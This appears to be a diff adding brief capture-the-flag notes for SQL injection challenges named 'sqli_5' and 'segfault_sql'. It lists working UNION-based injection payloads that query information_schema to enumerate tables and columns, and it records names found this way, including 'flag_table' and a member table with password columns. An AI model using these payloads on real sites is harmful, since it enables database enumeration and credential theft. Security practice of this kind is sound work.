@@ -1,0 +1,22 @@
+sqli_5
+
+flag_honey -> flag
+kkkkkkk_Not Here!
+
+' union select 1,2,3,4,5,table_name from information_schema.tables where table_schema = 'sqli_5' order by 1#
+secret -> flag
+' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret'#
+NONONO~~~~
+
+
+segfault_sql
+member
+-> user_id, user_pass, name, user_level, info, id, pass, email
+
+
+
+mario%' union select 1,2,3,column_name from information_schema.columns where table_name='flag_table'#
+
+idx flag
+
+id level rank_point rate
